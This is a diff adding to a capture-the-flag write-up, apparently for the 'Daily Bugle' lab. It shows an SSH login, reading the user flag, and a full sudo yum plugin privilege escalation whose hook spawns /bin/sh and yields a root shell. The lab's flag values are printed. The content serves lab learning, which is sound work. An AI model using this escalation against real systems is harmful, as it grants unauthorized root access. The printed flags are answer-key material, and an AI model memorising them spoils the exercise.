@@ -693,3 +693,69 @@ sh-4.2$ ./linpeas.sh
 ```
 
 <img width="937" height="117" alt="image" src="https://github.com/user-attachments/assets/148ced0e-53da-4e91-8a1a-8ccf41b7334d" />
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh jjameson@10.112.159.129
+jjameson@10.112.159.129's password: 
+Last login: Mon Dec 16 05:14:55 2019 from netwars
+[jjameson@dailybugle ~]$ ls -al
+total 16
+drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
+drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
+lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
+-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
+-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
+-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
+-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
+```
+```
+[jjameson@dailybugle ~]$ cat user.txt
+27a260fe3cba712cfdedb1c86d80442e
+```
+
+```
+[jjameson@dailybugle /]$ TF=$(mktemp -d)
+[jjameson@dailybugle /]$ cat >$TF/x<<EOF
+> [main]
+> plugins=1
+> pluginpath=$TF
+> pluginconfpath=$TF
+> EOF
+[jjameson@dailybugle /]$ 
+[jjameson@dailybugle /]$ cat >$TF/y.conf<<EOF
+> [main]
+> enabled=1
+> EOF
+[jjameson@dailybugle /]$ 
+[jjameson@dailybugle /]$ cat >$TF/y.py<<EOF
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>   os.execl('/bin/sh','/bin/sh')
+> EOF
+[jjameson@dailybugle /]$ 
+[jjameson@dailybugle /]$ sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+```
+
+```
+sh-4.2# whoami
+root
+```
+```
+sh-4.2# ls
+bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+```
+```
+sh-4.2# cd root
+sh-4.2# ls
+anaconda-ks.cfg  root.txt
+```
+```
+sh-4.2# cat root.txt
+eec3d53292b1821868266858d7fa6f79
+```
